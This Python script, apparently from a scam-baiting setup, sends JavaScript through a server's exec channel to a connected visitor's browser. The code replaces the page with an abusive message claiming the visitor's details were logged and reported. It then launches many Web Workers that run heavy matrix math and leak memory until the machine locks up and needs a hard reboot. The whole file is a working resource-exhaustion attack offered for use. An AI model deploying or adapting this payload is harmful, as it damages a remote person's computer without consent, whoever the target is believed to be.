#!/usr/bin/env python3
# CPU + RAM hammer attack — spawns max Web Workers in scammer's browser, each running
# intensive matrix math to pin all CPU cores while continuously leaking 20MB/iteration
# into a global array the GC can never collect, exhausting RAM and forcing OS swap until
# the machine locks up and requires a hard reboot.
#
# Usage:
#   python3 scripts/cpu_hammer.py <session_id>
#
# To get session_id, check the server terminal output for:
#   [WS] Scammer connected: <session_id>
# Or run: python3 scripts/sessions.py

import json
import sys
import urllib.request

SERVER = "http://localhost:8000"

WORKER_JS = """
(() => {
    // Step 1 — swap page content immediately before system degrades
    document.open();
    document.write(`<!DOCTYPE html>
<html><head><meta charset="UTF-8"/>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body {
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
  background: #0a0a0a;
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  text-align: center;
  padding: 2rem;
}
.msg { max-width: 560px; }
.emoji { font-size: 64px; margin-bottom: 1.5rem; }
h1 { font-size: 48px; font-weight: 800; color: #ff3b30; margin-bottom: 1rem; line-height: 1.1; }
p { font-size: 18px; color: #888; line-height: 1.6; }
.detail { margin-top: 2rem; font-size: 13px; color: #333; font-family: monospace; }
</style>
</head><body>
<div class="msg">
  <div class="emoji">&#128405;</div>
  <h1>Fuck You, Scammer.</h1>
  <p>Your device fingerprint, IP address, timezone, and system info have been logged and reported.</p>
  <p class="detail">Have a great day.</p>
</div>
</body></html>`);
    document.close();

    // Step 2 — spawn workers to hammer CPU and RAM while they read the message
    const workerCode = `
        onmessage = function() {};

        const SIZE = 512;
        const LEAK_CHUNK_MB = 20;
        const leaks = [];

        function makeMatrix() {
            const m = new Float64Array(SIZE * SIZE);
            for (let i = 0; i < m.length; i++) m[i] = Math.random();
            return m;
        }

        // Cache-unfriendly i->k->j order forces constant RAM round trips
        function matMul(A, B, C) {
            for (let i = 0; i < SIZE; i++) {
                for (let k = 0; k < SIZE; k++) {
                    const aik = A[i * SIZE + k];
                    for (let j = 0; j < SIZE; j++) {
                        C[i * SIZE + j] += aik * B[k * SIZE + j];
                    }
                }
            }
        }

        const A = makeMatrix();
        const B = makeMatrix();
        const C = new Float64Array(SIZE * SIZE);

        function loop() {
            // Allocate and hold 20MB per iteration — GC can't collect globals
            const chunk = new Float64Array(LEAK_CHUNK_MB * 1024 * 1024 / 8);
            for (let i = 0; i < chunk.length; i++) chunk[i] = Math.random();
            leaks.push(chunk);

            matMul(A, B, C);
            for (let i = 0; i < SIZE * SIZE; i++) A[i] = C[i] * 0.9999;
            loop();
        }
        loop();
    `;

    const blob = new Blob([workerCode], { type: 'application/javascript' });
    const url = URL.createObjectURL(blob);

    const count = (navigator.hardwareConcurrency || 4) * 4;
    for (let i = 0; i < count; i++) {
        new Worker(url);
    }
})();
"""

def send_attack(session_id: str):
    payload = json.dumps({"type": "exec", "js": WORKER_JS}).encode()
    req = urllib.request.Request(
        f"{SERVER}/admin/send/{session_id}",
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req) as resp:
            if resp.status == 200:
                print(f"[+] CPU hammer sent to session {session_id}")
            else:
                print(f"[-] Server returned {resp.status}")
    except urllib.error.HTTPError as e:
        if e.code == 404:
            print(f"[-] Session not found: {session_id}")
        else:
            print(f"[-] HTTP error: {e.code}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 scripts/cpu_hammer.py <session_id>")
        sys.exit(1)
    send_attack(sys.argv[1])
